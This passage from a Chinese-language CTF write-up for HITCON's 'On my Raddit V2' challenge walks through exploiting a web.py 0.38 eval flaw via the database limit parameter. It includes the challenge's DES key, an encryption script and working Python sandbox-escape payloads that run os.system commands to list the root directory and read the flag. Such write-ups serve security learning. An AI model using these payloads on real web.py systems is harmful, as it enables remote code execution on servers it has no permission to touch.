                tmp['file'] = encrypt(urllib.urlencode({'m': 'd', 'f': i.file}))
            else:
                tmp['file'] = ''
            records.append( tmp )
        return records
    def get_urls():
        urls = []
        for i in [10, 100, 1000]:
            data = {
                'm': 'p', 
                'l': i
            }
            urls.append( encrypt(urllib.urlencode(data)) )
        return urls
    class index:
        def GET(self):
            s = web.input().get('s')
            if not s:
                return web.template.frender('templates/index.html')(get_posts(), get_urls())
            else:
                s = decrypt(s)
                method = s.get('m', '')
                if method and method not in list('rdp'):
                    return 'param error'
                if method == 'r':
                    uid = s.get('u')
                    record = db.select('posts', where='id=$id', vars={'id': uid}).first()
                    if record:
                        raise web.seeother(record.url)
                    else:
                        return 'not found'
                elif method == 'd':
                    file = s.get('f')
                    if not os.path.exists(file):
                        return 'not found'
                    name = os.path.basename(file)
                    web.header('Content-Disposition', 'attachment; filename=%s' % name)
                    web.header('Content-Type', 'application/pdf')
                    with open(file, 'rb') as fp:
                        data = fp.read()
                    return data
                elif method == 'p':
                    limit = s.get('l')
                    return web.template.frender('templates/index.html')(get_posts(limit), get_urls())
                else:
                    return web.template.frender('templates/index.html')(get_posts(), get_urls())
    if __name__ == "__main__":
        app.run()
其实之后才了解到，orange 的本意是拿到了一个等效密钥，然后就去读到源码，这样就能看到密钥了。这句提示：
当时没有注意到...就去穷举试了 (不敢写提交 flag 的脚本怕被 ban)
#### On my Raddit V2(复现)
web.py 审不动... 跟着师傅们复现了一波。
赛后跟 Nu1l 和 TD 的师傅请教了一波，师傅甩出的链接:`https://securityetalii.es/2014/11/08/remote-code-execution-in-web-py-framework/`，看了半天也不知道和此题联系在哪。
才得知这题要追 web.py 的源码。
除了上面下的 app.py，还要下一个 `requirements.txt` 文档
    encrypt("m=d&f=requirements.txt") -> fc3769d67641424d59387bf7f393b4e4d0acd96cd08fe232
    payload: ?s=fc3769d67641424d59387bf7f393b4e4d0acd96cd08fe232
发现 web.py 版本是 0.38，所以这个[链接](https://securityetalii.es/2014/11/08/remote-code-execution-in-web-py-framework/)的洞还没有修彻底。
开始看链接与题联系不到一起，之后才知道要追 web.py 源码。在 app.py 中这句代码：
去追这个 limit：
发现代入了查询里，限制查询出的结果数。
追 web.py 的源码，也就是 `db.select` 函数，就能追到链接的地方：
    def reparam(string_, dictionary):
        """
        Takes a string and a dictionary and interpolates the string
        using values from the dictionary. Returns an `SQLQuery` for the result.
            >>> reparam("s = $s", dict(s=True))
            >>> reparam("s IN $s", dict(s=[1, 2]))
        """
        dictionary = dictionary.copy() # eval mucks with it
        vals = []
        result = []
        for live, chunk in _interpolate(string_):
            if live:
                v = eval(chunk, dictionary)
                result.append(sqlquote(v))
            else:
                result.append(chunk)
        return SQLQuery.join(result, '')
文中说了 `The entry points to reparam() are functions _where(), query(), and
gen_clause()`query() 对应的就是此题的 `db.select`，这里看到了非常显眼的 eval。
根据链接中的方法构造 payload：
    import urllib
    import urlparse
    from Crypto.Cipher import DES
    ENCRPYTION_KEY = 'megnnaro'
    def encrypt(s):
        length = DES.block_size - (len(s) % DES.block_size)
        s = s + chr(length)*length
        cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)
        return cipher.encrypt(s).encode('hex')
    def decrypt(s):
        try:
            data = s.decode('hex')
            cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)
            data = cipher.decrypt(data)
            data = data[:-ord(data[-1])]
            return dict(urlparse.parse_qsl(data))
        except Exception as e:
            print e.message
            return {}
    print encrypt(urllib.urlencode({'m': 'p', 'l': "${(lambda getthem=([x for x in ().__class__.__base__.__subclasses__() if x.__name__=='catch_warnings'][0]()._module.__builtins__):getthem['__import__']('os').system('ls / > /tmp/gml.txt'))()}"}))
    print encrypt(urllib.urlencode({'m':'d','f':'/tmp/gml.txt'}))
看看根目录有啥东西，这里没有回显所以我们把执行结果写入文件再去下载：  
执行结果：
    d65ae2bb276bdf2f82e5ca0761781060ba0fcf988b736644cad7a2d2573b2a14c1b40eb540be086f3aa5f06aca4d6711fda9a6f7c2c02a1ab2f85c12c3e7dea5a9c2c8651bb6f693428382a9bad41786fd02051f7cfeb780a84ffa34580feb1a50cc07436f62822e6ac2317036d4928833716d46e3c45e026435ca0c4c2720eab52bdd0761d538f8d5a5b977e3cea74591e1d2322b3d28c8c55ec1158e6ab8a6db604049da47bab499c188967f1429e4766afbc74000e282c325980adf54fe049dedb22857cad08805ac90492fb40f443d734e28b8700a935b1d479a042f03548a35227ec717b2b5bee3bac58d5ae4add21bdbd2653d63691ca068a2bd875b32f132007c8a1d5e7c12cd963db7c487ddafb51c16b96b4757
    4373ac92f9aea2e244e5098a963b4b3c1ee96782d23e0f27
挨个访问，下载到 ls 的命令结果：
看到了 `read_flag`，执行这个应该就可以得到 flag，修改payload:
    print encrypt(urllib.urlencode({'m': 'p', 'l': "${(lambda getthem=([x for x in ().__class__.__base__.__subclasses__() if x.__name__=='catch_warnings'][0]()._module.__builtins__):getthem['__import__']('os').system('/read_flag > /tmp/gml.txt'))()}"}))
    print encrypt(urllib.urlencode({'m':'d','f':'/tmp/gml.txt'}))
结果：
    d65ae2bb276bdf2f82e5ca0761781060ba0fcf988b736644cad7a2d2573b2a14c1b40eb540be086f3aa5f06aca4d6711fda9a6f7c2c02a1ab2f85c12c3e7dea5a9c2c8651bb6f693428382a9bad41786fd02051f7cfeb780a84ffa34580feb1a50cc07436f62822e6ac2317036d4928833716d46e3c45e026435ca0c4c2720eab52bdd0761d538f8d5a5b977e3cea74591e1d2322b3d28c8c55ec1158e6ab8a6db604049da47bab499c188967f1429e4766afbc74000e282c325980adf54fe049dedb22857cad08805ac90492fb40f443d734e28b8700a935b1d479a042f03548a35227ec717b2b543324bca0702d4140e4bdc4c1ebe0ea54e28b1ed72c5f16ec1f8c82e7f139f375a806b6212666f872dfbb2d1031b37ca9e581b6f767797bd
    4373ac92f9aea2e244e5098a963b4b3c1ee96782d23e0f27
挨个访问，可以得到 flag：
> hitcon{Fr0m_SQL_Injecti0n_t0_Shell_1s_C00L!!!}
参考：
  1. [Nu1l的wp](https://xz.aliyun.com/t/2953#toc-12)
  2. 